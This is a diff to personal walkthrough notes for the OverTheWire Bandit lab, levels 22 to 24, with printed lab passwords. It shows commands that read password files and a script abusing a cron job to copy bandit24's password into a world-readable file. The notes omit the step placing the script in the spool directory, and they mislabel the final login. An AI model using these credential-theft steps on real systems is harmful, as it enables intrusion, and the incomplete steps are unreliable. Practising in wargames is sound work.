@@ -269,6 +269,45 @@ echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
 cat /etc/bandit_pass/$myname > /tmp/$mytarget
 bandit22@bandit:/usr/bin$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 8ca319486bfbbc3663ea0fbe81326349
+bandit22@bandit:cat /tmp/8ca319486bfbbc3663ea0fbe81326349
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 
 ##ssh bandit23@bandit.labs.overthewire.org -p 2220
-P: 8ca319486bfbbc3663ea0fbe81326349
+P: jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+bandit23@bandit:~$ cd /etc/cron.d
+bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
+bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh 
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+	echo "Handling $i"
+	timeout -s 9 60 ./$i
+	rm -f ./$i
+    fi
+done
+bandit23@bandit:/etc/cron.d$ mkdir /tmp/skjl
+bandit23@bandit:/etc/cron.d$ cd /tmp/skjl
+bandit23@bandit:/tmp/skjl$ vim script.sh
+bandit23@bandit:/tmp/skjl$ cat script.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 >> /tmp/skjl/pass
+bandit23@bandit:/tmp/skjl$ chmod 777 script.sh
+((after a minute))
+bandit23@bandit:/tmp/skjl$ ls
+script.sh pass
+bandit23@bandit:/tmp/skjl$ cat pass
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+##ssh bandit23@bandit.labs.overthewire.org -p 2220
+P: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+ 
